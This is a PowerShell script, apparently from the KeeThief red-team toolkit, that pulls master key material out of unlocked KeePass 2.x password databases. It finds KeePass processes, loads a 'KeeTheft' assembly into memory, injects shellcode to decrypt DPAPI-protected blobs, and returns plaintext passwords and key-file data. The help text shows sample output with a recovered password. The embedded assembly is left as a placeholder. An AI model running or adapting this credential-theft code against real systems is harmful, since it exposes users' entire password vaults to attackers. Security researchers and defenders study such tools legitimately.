#requires -version 2

function Get-KeePassDatabaseKey {
<#
    .SYNOPSIS
        
        Retrieves database mastey key information for unlocked KeePass database.

        Function: Get-KeePassDatabaseKey
        Author: Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        Enumerates any KeePass 2.X (.NET) processes currently open, or takes a process object on the pipeline.
        Loades the C# KeeTheft assembly into memory and for each open KeePass process executes the GetKeePassMasterKeys()
        method on it. GetKeePassMasterKeys() will attach to the target KeePass process using CLR MD and enumerate
        all CLR heap objects, searching for a KeePassLib.PwDatabase object. If one is found, the path is extracted
        from the m_strUrl field, and all referenced objects are enumerated, searching for a KeePassLib.Keys.CompositeKey.
        If a composite master key is found, information for each key type (KcpPassword, KcpKeyFile, KcpUserAccount)
        is extracted, including the DPAPI encrypted data blobs of key data. For any encrypted blobs found, shellcode
        is injected into the KeePass process that calls MyRtlDecryptMemory() to decrypt the DPAPI memory blobs,
        returning the plaintext/unprotected key data.

    .PARAMETER Process

        Optional KeePass process object to pass in on the pipeline.

    .EXAMPLE

        PS C:\> Get-KeePassDatabaseKey -Verbose
        VERBOSE: Examining KeePass process 4184 for master keys


        Database             : C:\Users\harmj0y.TESTLAB\Desktop\keepass\NewDatabase.kdbx
        KeyType              : KcpUserAccount
        KeePassVersion       : 2.34.0.0
        ProcessID            : 4184
        ExecutablePath       : C:\Users\harmj0y.TESTLAB\Desktop\keepass\KeePass-2.34\KeePass.exe
        EncryptedBlobAddress : 49045328
        EncryptedBlob        : {113, 148, 127, 29...}
        EncryptedBlobLen     : 64
        PlaintextBlob        : {120, 181, 162, 116...}
        Plaintext            : eLWidCSt...
        KeyFilePath          : C:\Users\harmj0y.TESTLAB\AppData\Roaming\KeePass\ProtectedUserKey.bin

        Database             : C:\Users\harmj0y.TESTLAB\Desktop\keepass\NewDatabase.kdbx
        KeyType              : KcpKeyFile
        KeePassVersion       : 2.34.0.0
        ProcessID            : 4184
        ExecutablePath       : C:\Users\harmj0y.TESTLAB\Desktop\keepass\KeePass-2.34\KeePass.exe
        EncryptedBlobAddress : 49037240
        EncryptedBlob        : {137, 185, 6, 97...}
        EncryptedBlobLen     : 32
        PlaintextBlob        : {177, 5, 150, 205...}
        Plaintext            : sQWWzdcT...
        KeyFilePath          : C:\Users\harmj0y.TESTLAB\Documents\s.license

        Database             : C:\Users\harmj0y.TESTLAB\Desktop\keepass\NewDatabase.kdbx
        KeyType              : KcpPassword
        KeePassVersion       : 2.34.0.0
        ProcessID            : 4184
        ExecutablePath       : C:\Users\harmj0y.TESTLAB\Desktop\keepass\KeePass-2.34\KeePass.exe
        EncryptedBlobAddress : 48920376
        EncryptedBlob        : {228, 78, 75, 16...}
        EncryptedBlobLen     : 16
        PlaintextBlob        : {80, 97, 115, 115...}
        Plaintext            : Password123!
        KeyFilePath          :

    .EXAMPLE

        PS C:\> Get-Process KeePass | Get-KeePassDatabaseKey -Verbose
        VERBOSE: Examining KeePass process 4184 for master keys


        Database             : C:\Users\harmj0y.TESTLAB\Desktop\keepass\NewDatabase.kdbx
        KeyType              : KcpUserAccount
        ....
#>
    [CmdletBinding()] 
    param (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [System.Diagnostics.Process[]]
        [ValidateNotNullOrEmpty()]
        $Process
    )
    
    BEGIN {
        if(-not $PSBoundParameters['Process']) {
            try {
                $Process = Get-Process KeePass -ErrorAction Stop | Where-Object {$_.FileVersion -match '^2\.'}
            }
            catch {
                throw 'No KeePass 2.X instances open!'
            }
        }

        # load file off of disk instead
        # $Assembly = [Reflection.Assembly]::LoadFile((Get-Item -Path .\ReleaseKeePass.exe).FullName)

        # the KeyTheft assembly, generated with "Out-CompressedDll -FilePath .\ReleaseKeePass.exe | Out-File -Encoding ASCII .\compressed.ps1"

        <REPLACE>
    }

    PROCESS {

        ForEach($KeePassProcess in $Process) {

            if($KeePassProcess.FileVersion -match '^2\.') {

                $WMIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($KeePassProcess.ID)"
                $ExecutablePath = $WMIProcess | Select-Object -Expand ExecutablePath

                Write-Verbose "Examining KeePass process $($KeePassProcess.ID) for master keys"

                $Keys = $Assembly.GetType('KeeTheft.Program').GetMethod('GetKeePassMasterKeys').Invoke($null, @([System.Diagnostics.Process]$KeePassProcess))

                if($Keys) {

                    ForEach ($Key in $Keys) {

                        ForEach($UserKey in $Key.UserKeys) {

                            $KeyType = $UserKey.GetType().Name

                            $UserKeyObject = New-Object PSObject
                            $UserKeyObject | Add-Member Noteproperty 'Database' $UserKey.databaseLocation
                            $UserKeyObject | Add-Member Noteproperty 'KeyType' $KeyType
                            $UserKeyObject | Add-Member Noteproperty 'KeePassVersion' $KeePassProcess.FileVersion
                            $UserKeyObject | Add-Member Noteproperty 'ProcessID' $KeePassProcess.ID
                            $UserKeyObject | Add-Member Noteproperty 'ExecutablePath' $ExecutablePath
                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobAddress' $UserKey.encryptedBlobAddress
                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlob' $UserKey.encryptedBlob
                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobLen' $UserKey.encryptedBlobLen
                            $UserKeyObject | Add-Member Noteproperty 'PlaintextBlob' $UserKey.plaintextBlob

                            if($KeyType -eq 'KcpPassword') {
                                $Plaintext = [System.Text.Encoding]::UTF8.GetString($UserKey.plaintextBlob)
                            }
                            else {
                                $Plaintext = [Convert]::ToBase64String($UserKey.plaintextBlob)
                            }

                            $UserKeyObject | Add-Member Noteproperty 'Plaintext' $Plaintext

                            if($KeyType -eq 'KcpUserAccount') {
                                try {
                                    $WMIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($KeePassProcess.ID)"
                                    $UserName = $WMIProcess.GetOwner().User

                                    $ProtectedUserKeyPath = Resolve-Path -Path "$($Env:WinDir | Split-Path -Qualifier)\Users\*$UserName*\AppData\Roaming\KeePass\ProtectedUserKey.bin" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path

                                    $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath

                                }
                                catch {
                                    Write-Warning "Error enumerating the owner of $($KeePassProcess.ID) : $_"
                                }
                            }
                            else {
                                $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $UserKey.keyFilePath
                            }

                            $UserKeyObject.PSObject.TypeNames.Insert(0, 'KeePass.Keys')
                            $UserKeyObject
                        }
                    }
                }
                else {
                    Write-Verbose "No keys found for $($KeePassProcess.ID)"
                }
            }
            else {
                Write-Warning "Only KeePass 2.X is supported at this time."
            }
        }
    }
}
